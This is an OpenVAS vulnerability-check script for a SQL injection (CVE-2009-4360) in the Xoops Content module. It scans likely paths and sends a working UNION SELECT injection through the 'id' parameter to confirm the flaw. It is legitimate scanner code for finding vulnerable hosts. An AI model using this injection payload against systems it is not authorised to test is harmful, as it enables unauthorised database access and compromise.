###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xoops_content_module_sql_inj_vuln.nasl 5148 2017-01-31 13:16:55Z teissa $
#
# Xoops Content Module SQL Injection Vulnerability
#
# Authors:
# Sujit Ghosal <sghosal@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let the remote attacker to execute arbitrary SQL
  queires to compromise the remote machine running the vulnerable application.
  Impact Level: Application";
tag_affected = "Xoops 'Content' Module 0.5";
tag_insight = "This flaw is due to improper sanitization of data inside 'Content'
  module within the 'id' parameter which lets the remote unauthenticated
  user to run arbitrary SQL Commands.";
tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";
tag_summary = "This host is running Xoops and is prone to SQL Injection
  vulnerability.";

if(description)
{
  script_id(900732);
  script_version("$Revision: 5148 $");
  script_tag(name:"last_modification", value:"$Date: 2017-01-31 14:16:55 +0100 (Tue, 31 Jan 2017) $");
  script_tag(name:"creation_date", value:"2009-12-24 14:01:59 +0100 (Thu, 24 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4360");
  script_bugtraq_id(37155);
  script_name("Xoops Content Module SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/54489");
  script_xref(name : "URL" , value : "http://securityreason.com/exploitalert/7494");
  script_xref(name : "URL" , value : "http://www.packetstormsecurity.org/0911-exploits/xoopscontent-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");

xoopsPort = get_http_port(default:80);
if(!xoopsPort){
  exit(0);
}

if(!can_host_php(port:xoopsPort)){
  exit(0);
}

if(safe_checks()){
  exit(0);
}

foreach dir (make_list("/", "/xoops", "/cms", "/content", cgi_dirs()))
{
  sndReq = http_get(item: string(dir + "/modules/content/index.php?id=1"),
                    port: xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  if("blockContent" >< rcvRes && "blockTitle" >< rcvRes)
  {
    request = http_get(item:dir+"/modules/content/index.php?id=-1+UNION+SELECT"+
                       "+1,2,3,@@version,5,6,7,8,9,10,11--", port:xoopsPort);
    response = http_send_recv(port:xoopsPort, data:request);

    if("Set-Cookie: " >< response && "PHPSESSID" >< response &&
                                          "path=/" >< response)
    {
      security_message(xoopsPort);
      exit(0);
    }
  }
}
